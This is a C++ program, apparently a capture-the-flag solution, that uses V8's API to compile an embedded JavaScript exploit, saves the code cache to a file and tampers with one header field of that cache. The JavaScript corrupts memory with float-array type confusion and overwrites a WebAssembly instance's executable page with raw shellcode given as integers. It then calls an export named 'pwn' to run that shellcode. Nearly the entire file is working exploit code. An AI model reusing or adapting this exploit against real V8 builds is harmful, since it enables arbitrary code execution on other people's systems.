// Copyright 2022 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "include/libplatform/libplatform.h"
#include "include/v8-context.h"
#include "include/v8-initialization.h"
#include "include/v8-isolate.h"
#include "include/v8-local-handle.h"
#include "include/v8-primitive.h"
#include "include/v8-script.h"
#include "src/api/api-inl.h"
#include "src/base/platform/platform.h"
#include "src/execution/isolate-inl.h"
#include "src/objects/instance-type.h"
#include "src/roots/roots.h"
#include "src/snapshot/code-serializer.h"

int main(int argc, char* argv[]) {
  v8::V8::InitializeICUDefaultLocation(argv[0]);
  v8::V8::InitializeExternalStartupData(argv[0]);
  std::unique_ptr<v8::Platform> platform = v8::platform::NewDefaultPlatform();
  v8::V8::InitializePlatform(platform.get());
  v8::V8::Initialize();

  v8::Isolate::CreateParams create_params;
  create_params.array_buffer_allocator =
      v8::ArrayBuffer::Allocator::NewDefaultAllocator();
  v8::Isolate* isolate = v8::Isolate::New(create_params);

  v8::ScriptCompiler::CachedData* code_cache;

  {
    v8::Isolate::Scope isolate_scope(isolate);
    v8::HandleScope handle_scope(isolate);
    v8::Local<v8::Context> context = v8::Context::New(isolate);
    v8::Context::Scope context_scope(context);

    v8::Local<v8::String> source_string = v8::String::NewFromUtf8Literal(
        isolate,
        "let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,0,11]);"
        "let x = [0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.8, 0.9, 1.1, 1.2, 1.3, "
        "1.4, 1.5, 1.6, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.8, 0.9, 1.1, 1.2, "
        "1.3, 1.4, 1.5, 1.9];"
        "let y = [0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.8, 0.9, 1.1, 1.2, 1.3, "
        "1.4, 1.5, 1.6, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.8, 0.9, 1.1, 1.2, "
        "1.3, 1.4, 1.5, 1.9];"
        "let z = [0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.8, 0.9, 1.1, 1.2, 1.3, "
        "1.4, 1.5, 1.6, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.8, 0.9, 1.1, 1.2, "
        "1.3, 1.4, 1.5, 1.9];"
        "let a = new ArrayBuffer(256);"
        "let wasm_mod = new WebAssembly.Module(wasm_code);"
        "let wasm_instance = new WebAssembly.Instance(wasm_mod);"
        "z[0] = a;"
        "z[1] = wasm_instance;"
        "let f=new Float64Array(2);let h=new Uint32Array(f.buffer);"
        "f[1]=x[20];"
        "h[0]=h[3]+88;h[1]=0x2000;"
        "x[7]=f[0];"
        "let s=y[0];"
        "h[0]=h[2]+20;h[1]=0x2000;"
        "x[7]=f[0];"
        "y[0]=s;"
        "let u=new Uint32Array(a);"
        "let pwn = wasm_instance.exports.main;"
        "pwn();"
        "u[0]=217973098;u[1]=800606244;u[2]=1718903139;u[3]=1348952428;u[4]=1223133512;u[5]=16843192;u[6]=16843009;u[7]=3091746817;u[8]=1735745634;u[9]=23486573;u[10]=604254536;u[11]=1784084017;u[12]=21519880;u[13]=2303219430;u[14]=1792160230;u[15]=84891707;"
        "pwn();"
      );

    v8::ScriptCompiler::Source source(source_string);
    v8::Local<v8::UnboundScript> script =
        v8::ScriptCompiler::CompileUnboundScript(
            isolate, &source, v8::ScriptCompiler::kEagerCompile)
            .ToLocalChecked();

    code_cache = v8::ScriptCompiler::CreateCodeCache(script);
  }

  *(uint32_t*)(code_cache->data + 8) = 0x0;
  FILE* f = fopen("dumpc", "wb");
  if (fwrite(code_cache->data, 1, code_cache->length, f) < 0) {
    abort();
  }

  isolate->Dispose();
  v8::V8::Dispose();
  v8::V8::DisposePlatform();
  delete create_params.array_buffer_allocator;
  return 0;
}
